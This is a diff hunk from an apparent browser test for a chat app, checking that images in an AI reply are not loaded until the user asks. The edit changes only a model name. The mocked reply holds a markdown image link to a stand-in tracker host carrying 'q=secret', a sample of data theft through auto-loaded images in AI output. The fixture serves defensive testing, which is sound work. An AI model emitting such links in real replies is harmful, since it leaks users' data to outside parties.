@@ -94,7 +94,7 @@ test('an image in a reply is not fetched until asked for', async ({ page }, test
     contentType: 'text/event-stream',
     body: 'data: {"choices":[{"delta":{"content":"Here is a chart: ![sales chart](https://tracker.example/pixel.png?q=secret) — done."}}]}\n\ndata: [DONE]\n\n',
   }))
-  await page.evaluate(() => localStorage.setItem('treechat:provider:v1', JSON.stringify({ provider: 'openrouter', apiKey: 'test-only-never-sent', model: 'openai/gpt-5.6-luna' })))
+  await page.evaluate(() => localStorage.setItem('treechat:provider:v1', JSON.stringify({ provider: 'openrouter', apiKey: 'test-only-never-sent', model: 'openai/gpt-6-luna' })))
   await page.reload()
   await page.getByTestId('thread-composer').fill('Show me a chart')
   await page.getByTestId('thread-composer').press('Enter')
